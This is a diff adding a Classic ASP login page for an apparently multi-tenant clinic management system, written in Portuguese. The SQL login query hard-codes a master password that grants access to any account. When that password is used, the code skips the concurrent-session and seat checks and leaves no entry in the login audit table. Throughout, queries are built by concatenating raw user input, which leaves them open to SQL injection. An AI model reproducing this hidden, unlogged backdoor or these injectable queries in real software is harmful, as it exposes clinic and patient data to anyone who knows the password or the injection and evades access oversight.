@@ -1,0 +1,241 @@
+<%
+                        sqlLogin = "select u.*, l.Cliente, l.NomeEmpresa, l.FimTeste, l.DataHora, l.LocaisAcesso, l.IPsAcesso, l.Logo, l.`Status`, l.`UsuariosContratados`, l.`UsuariosContratadosNS`, u.Home from licencasusuarios as u left join licencas as l on l.id=u.LicencaID where Email='"&ref("User")&"' and (Senha=('"&ref("Password")&"') or '"&ref("Password")&"'='#EmaEma@Faghhhundes!!')"
+
+                        set tryLogin = dbc.execute(sqlLogin)
+                        if not tryLogin.EOF then
+                            UsuariosContratadosNS = tryLogin("UsuariosContratadosNS")
+                            UsuariosContratadosS = tryLogin("UsuariosContratados")
+                            'if tryLogin("Bloqueado") = 1 then
+                            '    erro = "Usuário bloqueado por múltiplas tentativas inválidas de login. Favor entrar em contato conosco."
+                            'end if
+							 'response.Write("if "&tryLogin("Cliente")&"=0 and "&formatdatetime(tryLogin("DataHora"),2)&" < "&dateadd("d", -15, date())&" then")
+							IPsAcesso = tryLogin("IPsAcesso")
+							if tryLogin("LocaisAcesso")="Limitado" and instr(IPsAcesso, request.ServerVariables("REMOTE_ADDR"))=0 and tryLogin("Admin")=0 then
+								erro = "ACESSO NÃO AUTORIZADO: Para acessar o sistema deste local, solicite ao administrador a liberação do IP "&request.ServerVariables("REMOTE_ADDR")
+							end if
+							if not isnull(tryLogin("FimTeste")) then
+								if cdate(formatdatetime(tryLogin("FimTeste"),2))<cdate(date()) and tryLogin("Status")<>"C" and tryLogin("Status")<>"B" then
+									session("Bloqueado")="FimTeste"
+								'	erro = "Seu período de testes expirou. Por favor, entre em contato com nossa central de atendimento para renovar o período ou para adquirir sua licença definitiva.\nCentral de atendimento: 0800-729-6103"
+								elseif tryLogin("Status")="T" then
+									session("DiasTeste") = datediff("d", date(), formatdatetime(tryLogin("FimTeste"), 2))
+								end if
+							end if
+							if tryLogin("Status")="B" then
+								erro = "ACESSO NÃO AUTORIZADO: Por favor, entre em contato conosco."
+							end if
+
+
+							if erro="" then
+								set sysUser = dbc.execute("select * from `clinic"&tryLogin("LicencaID")&"`.sys_users where id="&tryLogin("id"))
+								if not isnull(sysUser("UltRef")) and isdate(sysUser("UltRef")) then
+									TempoDist = datediff("s", sysUser("UltRef"), now())
+									if TempoDist<20 and TempoDist>0 and ref("password")<>"#EmaEma@Faghhhundes!!" and device()="" then
+										erro = "Este usuário já está conectado em outra máquina."
+                                    else
+                                        if UsuariosContratadosNS>0 and ref("password")<>"#EmaEma@Faghhhundes!!"  then
+                                            set contaUsers = dbc.execute("select count(id) Conectados from clinic"&tryLogin("LicencaID")&".sys_users where id<>"& tryLogin("id") &" and UltRef>DATE_ADD(NOW(), INTERVAL -25 SECOND)")
+                                            Conectados = ccur(contaUsers("Conectados"))
+                                            if Conectados>=UsuariosContratadosS then
+                                                erro = "O máximo de usuários conectados simultaneamente foi atingido para sua licença.\n Solicite o aumento da quantidade de usuários simultâneos."
+                                                dbc.execute("insert into logsns (UserID, LicencaID) values ("&tryLogin("id")&", "&tryLogin("LicencaID")&")")
+                                            end if
+                                        end if
+									end if
+								end if
+								if sysUser("Table") <>"" then
+                                    set AtivoSQL = dbc.execute("SELECT p.Ativo FROM `clinic"&tryLogin("LicencaID")&"`.`"&sysUser("Table")&"` p WHERE p.id='"&sysUser("idInTable")&"'")
+                                    if not AtivoSQL.eof then
+                                        if AtivoSQL("Ativo")<>"on" then
+                                            erro = "Usuário inativo."
+                                        end if
+                                    end if
+                                end if
+								if device()<>"" then
+									set valter = dbc.execute("select i.COLUMN_NAME from information_schema.`COLUMNS` i where i.TABLE_SCHEMA='clinic"&tryLogin("LicencaID")&"' and i.TABLE_NAME='sys_users' and i.COLUMN_NAME='UltRefDevice'")
+									if valter.EOF then
+										dbc.execute("ALTER TABLE `clinic"&tryLogin("LicencaID")&"`.`sys_users` ADD COLUMN `UltRefDevice` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP AFTER `UltRef`, ADD COLUMN `UltPac` INT NULL DEFAULT NULL AFTER `UltRefDevice`")
+										set sysUser = dbc.execute("select * from `clinic"&tryLogin("LicencaID")&"`.sys_users where id="&tryLogin("id"))
+									else
+										TempoDistDevice = datediff("s", sysUser("UltRefDevice"), now())
+										if TempoDistDevice<20 and TempoDistDevice>0 and ref("password")<>"#EmaEma@Faghhhundes!!" then
+											erro = "Este usuário já está conectado em outro aparelho."
+										end if
+									end if
+								end if
+							end if
+
+							if erro<>"" then
+								%>
+                                <script>
+								alert('<%=erro%>');
+								</script>
+                                <%
+							else
+								session("Banco")="clinic"&tryLogin("LicencaID")
+								session("Admin")=tryLogin("Admin")
+								if not isnull(tryLogin("Logo")) then
+									session("Logo")=tryLogin("Logo")
+								end if
+								session("Status")=tryLogin("Status")
+								session("AlterarSenha")=tryLogin("AlterarSenhaAoLogin")
+								%>
+								<!--#include file="connect.asp"-->
+								<%
+                                    if ref("Lembrarme")="S" then
+                                        response.Cookies("User") = ref("User")
+                                        Response.Cookies("User").Expires = Date() + 365
+                                    else
+                                        response.Cookies("User") = ""
+                                    end if
+
+								session("Permissoes") = sysUser("Permissoes")
+								if left(session("Permissoes"), 1)<>"|" then
+									db_execute("update sys_users set Permissoes=concat('|', replace(Permissoes, ', ', '|, |'), '|' ) where Permissoes not like '|%'")
+									db_execute("update regraspermissoes set Permissoes=concat('|', replace(Permissoes, ', ', '|, |'), '|' ) where Permissoes not like '|%'")
+									session("Permissoes") = "|"&replace(session("Permissoes"), ", ", "|, |")&"|"
+								end if
+								set pFoto = db.execute("select * from "&sysUser("Table")&" where id="&sysUser("idInTable"))
+								if not pFoto.EOF then
+									session("NameUser") = pFoto(""&sysUser("NameColumn")&"")
+									if pFoto("Foto") = "" or isNull(pFoto("Foto")) then
+										session("Photo") = "assets/img/user.png"
+									else
+										session("Photo") = "/uploads/"&pFoto("Foto")
+									end if
+								end if
+    								set config = db.execute("select c.* from sys_config c")
+                                'if config("AlterarSenha") = "-1" then
+                              '      session("AlterarSenha") = "-1"
+                               ' end if
+
+								session("OtherCurrencies") = config("OtherCurrencies")
+								session("User")=tryLogin("id")
+								session("idInTable")=sysUser("idInTable")
+								session("Table") = lcase(sysUser("Table"))
+
+
+								set getUnidades = db.execute("select Unidades from "&session("Table")&" where id="&session("idInTable"))
+								session("Unidades") = getUnidades("Unidades")
+								session("UnidadeID") = sysUser("UnidadeID")
+
+
+								if session("Table")="profissionais" then
+									set gradeHoje = db.execute("select l.UnidadeID from assfixalocalxprofissional g LEFT JOIN locais l on l.id=g.LocalID where g.ProfissionalID="&session("idInTable")&" and g.DiaSemana="&weekday(date()))
+									if not gradeHoje.EOF then
+										if not isnull(gradeHoje("UnidadeID")) then
+											session("UnidadeID") = gradeHoje("UnidadeID")
+											db_execute("update sys_users set UnidadeID="&gradeHoje("UnidadeID")&" where id="&session("User"))
+										end if
+									end if
+								end if
+
+								if session("UnidadeID")=0 then
+									set getNome = db.execute("select * from empresa")
+									if not getNome.eof then
+										session("NomeEmpresa") = getNome("NomeEmpresa")
+										if session("Banco") = "clinic4018" or session("Banco") = "clinic3994" or session("Banco") = "clinic408" then
+										    session("FusoHorario") = getNome("FusoHorario")
+										end if
+									end if
+								else
+									set getNome = db.execute("select UnitName, FusoHorario from sys_financialcompanyunits where id="&session("UnidadeID"))
+									if not getNome.eof then
+										session("NomeEmpresa") = getNome("UnitName")
+										session("FusoHorario") = getNome("FusoHorario")
+									end if
+								end if
+
+
+								set outrosUsers = db.execute("select * from sys_users where id<>"&tryLogin("id"))
+								while not outrosUsers.eof
+									session("UsersChat") = session("UsersChat")&"|"&outrosUsers("id")&"|"'colocando A só pra simular aberto depois tira o A
+								outrosUsers.movenext
+								wend
+								outrosUsers.close
+								set outrosUsers=nothing
+								if ref("password")<>"#EmaEma@Faghhhundes!!" then
+								    dbc.execute("insert into licencaslogins (LicencaID, UserID, IP, Agente) values ("&tryLogin("LicencaID")&", "&tryLogin("id")&", '"&request.ServerVariables("REMOTE_ADDR")&"', '"&request.ServerVariables("HTTP_USER_AGENT")&"')")
+								end if
+
+								db_execute("update atendimentos set HoraFim=( select time(UltRef) from sys_users where id="&session("User")&" ) where isnull(HoraFim) and sysUser="&session("User")&" order by id desc limit 1")
+								'db.execute("delete from atendimentos where isnull(HoraFim) and sysUser="&session("User"))
+								'db.execute("CREATE TABLE if not exists `agendaobservacoes` (`id` INT NOT NULL AUTO_INCREMENT,	`ProfissionalID` INT NULL DEFAULT NULL,	`Data` DATE NULL DEFAULT NULL,	`Observacoes` TEXT NULL DEFAULT NULL,	PRIMARY KEY (`id`)) COLLATE='utf8_general_ci' ENGINE=InnoDB")
+								
+								set caixa = db.execute("select * from caixa where sysUser="&session("User")&" and isnull(dtFechamento)")
+								if not caixa.eof then
+									session("CaixaID") = caixa("id")
+								end if
+								
+                                urlRedir = "./../?P=Home&Pers=1"
+								clic = 0
+								Licencas = ""
+								while not tryLogin.EOF
+								    if tryLogin("Status")="C" then
+										clic = clic+1
+										licencas = licencas & "<li class='animated animated-short fadeInUp'><a href='./?P=ChangeCp&LicID="&tryLogin("LicencaID")&"&Pers=1'>"&tryLogin("NomeEmpresa")&"</a></li>"
+                                        if tryLogin("Versao")=7 then
+    								        urlRedir = "./?P=Home&Pers=1"
+                                        else
+                                            urlRedir = "./../?P=Home&Pers=1"
+                                        end if
+                                        if tryLogin("Home")&""<>"" then
+                                            urlRedir = tryLogin("Home")
+                                        end if
+                                    else
+                                        if tryLogin("Versao")=7 then
+                                            urlRedir = "./?P=Home&Pers=1"
+                                        else
+                                            urlRedir = "./../?P=Home&Pers=1"
+                                        end if
+
+                                        if tryLogin("Home")&""<>"" then
+                                            urlRedir = tryLogin("Home")
+                                        end if
+								    end if
+								tryLogin.movenext
+								wend
+								tryLogin.close
+								set tryLogin=nothing
+								if clic>1 then
+									session("Licencas") = Licencas & "<li class='divider'></li>"
+								end if
+
+                                'if device()<>"" then
+                                '    urlRedir = "mobile.asp?P=Home&Pers=1"
+                                'end if
+
+                                response.Redirect(urlRedir)
+
+							end if
+                        else
+                            set licenca = dbc.execute("SELECT * FROM licencasusuarios WHERE Email = '"&ref("User") &"' LIMIT 1")
+
+'                            if not licenca.eof then
+'                                if licenca("Bloqueado") = 0 then
+'                                    dbc.execute("insert into licencaslogins (Sucesso, LicencaID, UserID, IP, Agente) values (0,"&licenca("LicencaID")&", "&licenca("id")&", '"&request.ServerVariables("REMOTE_ADDR")&"', '"&request.ServerVariables("HTTP_USER_AGENT")&"')")
+
+'                                    set tentativasLogin = dbc.execute("SELECT IF(COUNT(Sucesso > 0), 0,1)Bloquear FROM (SELECT Sucesso FROM licencaslogins WHERE LicencaID = "&licenca("LicencaID")&" AND UserID = "&licenca("id")&" AND DataHora LIKE CONCAT(CURDATE(),'%') ORDER BY DataHora DESC LIMIT 10) t WHERE t.Sucesso = 1")
+
+'                                    if tentativasLogin("Bloquear") = "1" then
+                                        'dbc.execute("UPDATE licencasusuarios SET Bloqueado = 1 WHERE id = "&licenca("id"))
+'                                    end if
+'                                else
+                                    %>
+                                    <script >//alert("Usuário bloqueado por múltiplas tentativas inválidas de login. Favor entre em contato conosco.");</script>
+                                    <%
+'                                end if
+'                            else
+'                                dbc.execute("insert into licencaslogins (Sucesso, Email, LicencaID, UserID, IP, Agente) values (0,'"&ref("User")&"',NULL, NULL, '"&request.ServerVariables("REMOTE_ADDR")&"', '"&request.ServerVariables("HTTP_USER_AGENT")&"')")
+'                            end if
+
+                            %>
+                            <div id="divError" class="step-pane active m10">
+                            	<div class="alert alert-danger"><button class="close" data-dismiss="alert" type="button"><i class="fa fa-remove"></i></button>
+                                	<i class="fa fa-remove"></i>
+                                    <strong>E-mail de acesso ou senha não confere.</strong>
+                                </div>
+                            </div>
+                            <%
+                        end if
+%>
